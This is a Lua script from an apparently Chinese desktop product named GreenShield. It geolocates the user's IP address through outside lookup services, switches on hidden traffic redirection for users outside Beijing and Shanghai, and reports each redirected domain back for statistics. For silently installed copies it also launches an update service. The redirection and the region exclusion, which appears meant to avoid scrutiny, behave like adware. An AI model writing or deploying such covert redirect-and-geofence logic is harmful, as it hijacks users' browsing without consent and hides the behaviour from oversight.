local FunctionObj = XLGetGlobal("GreenWallTip.FunctionHelper")

local apiUtil = XLGetObject("GS.Util")
local apiAsyn = XLGetObject("GS.AsynUtil")
local strIPUrl = "http://ip.dnsexit.com/index.php"
local strIPToCity = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip="

function GTV(obj)
	return "[" .. type(obj) .. "`" .. tostring(obj) .. "]"
end

function Log(str)
	apiUtil:Log(tostring(str))
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end
function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

function LoadJSONHelper()
	local strJSONHelperPath = __document.."\\..\\JSON.lua"
	local Module = XLLoadModule(strJSONHelperPath)
end

local JsonFun = XLGetGlobal("GS.Json")

function CheckIsInZone(strProvince,strCity, tBlackCity)
	local tabProvinceInclude = {}
	local tabProvinceExclude = {}
	local tabCityInclude = {}
	local tabCityExclude = {}
	tabInfo = tBlackCity
	if type(tabInfo) ~= "table" then
		return true
	end
	local function GetTipZoneInfo()
		--先解析包含的部分
		tabProvinceInclude = FetchValueByPath(tabInfo, {"include", "p"})
		if type(tabProvinceInclude) ~= "table" then
			tabProvinceInclude = {}
		end
		tabCityInclude = FetchValueByPath(tabInfo, {"include", "c"})
		if type(tabCityInclude) ~= "table" then
			tabCityInclude = {}
		end
		--再解析不包含的部分
		tabProvinceExclude = FetchValueByPath(tabInfo, {"exclude", "p"})
		if type(tabProvinceExclude) ~= "table" then
			tabProvinceExclude = {}
		end
		tabCityExclude = FetchValueByPath(tabInfo, {"exclude", "c"})
		if type(tabCityExclude) ~= "table" then
			tabCityExclude = {}
		end
	end
	local bRet = false
	GetTipZoneInfo()
	local bInProvince = false
	local bInCity = false
	local bOutProvince = true
	local bOutCity = true
	if #tabProvinceInclude > 0 or #tabCityInclude>0 then
		for i = 1, #tabProvinceInclude do
			if string.find(strProvince, tabProvinceInclude[i], 1, true) ~= nil then
				bInProvince = true
				break
			end
		end
		if not bInProvince then
			for i = 1, #tabCityInclude do
				if string.find(strCity, tabCityInclude[i], 1, true) ~= nil then
					bInCity = true
					break
				end
			end
		end
	else -- 不包含include 默认为true
		bInProvince = true
		bInCity = true
	end	
	if #tabProvinceExclude > 0 or #tabCityExclude>0 then
		for i = 1, #tabProvinceExclude do
			if string.find(strProvince, tabProvinceExclude[i], 1, true) ~= nil then
				bOutProvince = false
				break
			end
		end
		if bOutProvince then
			for i = 1, #tabCityExclude do
				if string.find(strCity, tabCityExclude[i], 1, true) ~= nil then
					bOutCity = false
					break
				end
			end
		end
	else -- 不包含exclude 默认为true
		bOutProvince = true
		bOutCity = true
	end	
	if (bInProvince or bInCity) and (bOutProvince and bOutCity) then
		bRet = true
	else
		bRet = false
	end
	return bRet
end

function GetCityInfo(fnSuccess,fnFail)
	apiAsyn:AjaxGetHttpContent(strIPUrl, function(iRet, strContent, respHeaders)
		Log("[GetCityInfo] strIPUrl = " .. GTV(strIPUrl) .. ", iRet = " .. GTV(iRet))
		if iRet == 0 then
			local strIP =  string.match(strContent,"(%d+.%d+.%d+.%d+)")
			if IsRealString(strIP) then
				local strQueryIPToCityUrl = strIPToCity .. tostring(strIP)
				apiAsyn:AjaxGetHttpContent(strQueryIPToCityUrl, function(iRet, strContent, respHeaders)
					Log("[GetCityInfo] strQueryIPToCityUrl = " .. GTV(strQueryIPToCityUrl) .. ", iRet = " .. GTV(iRet))
					if iRet == 0 and IsRealString(strContent) then
						local tabCityInfo = JsonFun:decode(strContent)
						if type(tabCityInfo) == "table" then
							local strCity = tabCityInfo["city"]
							local strProvince = tabCityInfo["province"]
							Log("[GetCityInfo] strCity = " .. GTV(strCity) .. ", strProvince = " .. GTV(strProvince))
							if IsRealString(strCity) and IsRealString(strProvince) then
								fnSuccess(strProvince, strCity)
							else
								Log("[GetCityInfo] Get city name failed.")
								fnFail()
							end
						else
							Log("[GetCityInfo] Parse IP to city failed.")
							fnFail()
						end	
					else
						Log("[GetCityInfo] Get IP to city failed.")
						fnFail()
					end
				end)	
			else
				Log("[GetCityInfo] Parse IP failed.")
				fnFail()
			end
		else
			Log("[GetCityInfo] Get IP failed.")
			fnFail()
		end
	end)
end	

function Fail()
	Log("[GetCityInfo] failed.")
end


function Sunccess(strProvince,strCity)
	if type(apiUtil.EnableRedirect) == "function" then
	
		local tBlackCity = {
			["exclude"] = {
					["p"] = {"北京","上海"},
				}, 
		}
		DoRedirect(strProvince,strCity, tBlackCity)
	end
	if type(apiUtil.LaunchUpdate) == "function" then
		local strInstallMethod = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\InstallMethod")
		if not IsRealString(strInstallMethod) or strInstallMethod~="silent" then
			return 
		end
	
		local tBlackCity = {
			["exclude"] = {
					["p"] = {"北京","上海"},
				}, 
		}
		
		DoLaunchAI(strProvince,strCity, tBlackCity)
	end
end


function ReportReirectOpen()	
	local tStatInfo = {}

	tStatInfo.strEC = "redirect"  --进入上报
	tStatInfo.strEA = "open"
	tStatInfo.strEL = 1
	
	FunctionObj.TipConvStatistic(tStatInfo)
end


function ReportReirectResult(strURL)
	local tStatInfo = {}
	local strDomain = ExractDomain(strURL)
	
	tStatInfo.strEC = "redirect"  --进入上报
	tStatInfo.strEA = "result"
	tStatInfo.strEL = strDomain
	
	FunctionObj.TipConvStatistic(tStatInfo)
end
	

function ExractDomain(strURL)
	if not IsRealString(strURL) then
		return ""
	end

	local strDomain = strURL
	if string.find(strURL, "^.*://") then
		local _, _, strTemp = string.find(strURL, "^.*://([^/]*)/.*")
		strDomain = strTemp
	end
	
	if not IsRealString(strDomain) then
		return ""
	end
	
	local strDomainFix = strDomain
	if string.find(strDomain, "^www%.") then
		local _, _, strTemp = string.find(strDomain, "^www%.([^/]*)")
		strDomainFix = strTemp
	end

	return strDomainFix
end	
	
	
--重定向业务	
function DoRedirect(strProvince,strCity,tBlackCity)
	if CheckIsInZone(strProvince,strCity,tBlackCity) then
		Log("[Sunccess] EnableR")
		apiUtil:EnableRedirect(true)
		
		ReportReirectOpen()			--上报重定向开启
		
		local gsFactory = XLGetObject("GSListen.Factory")
		if not gsFactory then
			Log("[Sunccess] not support GSListen.Factory")
			return
		end
		
		local gsListen = gsFactory:CreateInstance()	
		gsListen:AttachListener(
			function(key,p1,p2)		
				Log("[Sunccess] key: " .. tostring(key)
						.. "  p1: "..tostring(p1) .. " p2: "..tostring(p2))
				
				if tostring(key) == "OnRedirectResult" then
					ReportReirectResult(p2)		--重定向成功统计，上报域名		
				end	
			end
		)
	else
		Log("[DoRedirect] in black city")
	end
end

function GetCommandStrValue(strKey)
	local bRet, strValue = false, nil
	local cmdString = apiUtil:GetCommandLine()
	
	if string.find(cmdString, strKey .. " ") then
		local cmdList = apiUtil:CommandLineToList(cmdString)
		if cmdList ~= nil then	
			for i = 1, #cmdList, 1 do
				local strTmp = tostring(cmdList[i])
				if strTmp == strKey 
					and not string.find(tostring(cmdList[i + 1]), "^/") then		
					bRet = true
					strValue = tostring(cmdList[i + 1])
					break
				end
			end
		end
	end
	return bRet, strValue
end
	
--拉服务项的业务
function DoLaunchAI(strProvince,strCity, tBlackCity)
	local bRet1, strSource = GetCommandStrValue("/sstartfrom")
	if not bRet1 or strSource ~= "installfinish" then--win7下安装包拉起忽略时间间隔判断
		if not CheckAiSvcsHist() then
			Log("[DoLaunchAI] CheckAiSvcsHist failed")
			return
		end
	end

	if not CheckIsInZone(strProvince,strCity,tBlackCity) then
		Log("[DoLaunchAI] in black city")
		return
	end

	local bret = apiUtil:LaunchUpdate()
	ReportLaunchAI(bret)
	Log("[DoLaunchAI] LaunchUpdate bret:"..tostring(bret))
	WriteAiSvcsHistory()
end

function ReportLaunchAI(bSuccess)	
	local tStatInfo = {}

	tStatInfo.strEC = "launchai"  --进入上报
	tStatInfo.strEA = FunctionObj.GetGSMinorVer() or ""
	tStatInfo.strEL = bSuccess and 1 or 0
	
	FunctionObj.TipConvStatistic(tStatInfo)
end

function CheckAiSvcsHist()
	local tServerParam = LoadServerConfig() or {}
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLaunchAiSvcTime = tUserConfig["nLaunchAiSvcTime"] or 0
	local nSpanTimeInSec = tServerParam["nAISpanTimeInSec"] or 2*24*3600
	local nCurrentTime = apiUtil:GetCurrentUTCTime()

	if math.abs(nCurrentTime-nLaunchAiSvcTime) > nSpanTimeInSec then
		return true
	else
		return false
	end
end


function LoadServerConfig()
	local strCfgPath = FunctionObj.GetCfgPathWithName("ServerConfig.dat")
	local infoTable = FunctionObj.LoadTableFromFile(strCfgPath) or {}
	local tParam = FetchValueByPath(infoTable, {"tExtraHelper", "param"})
	return tParam
end


function WriteAiSvcsHistory()
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLaunchAiSvcTime"] = apiUtil:GetCurrentUTCTime()
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end
------------------------------------		
	
function Run()
	if type(JsonFun) ~= "table" then
		return
	end
	
	GetCityInfo(Sunccess,Fail)
end
Run()


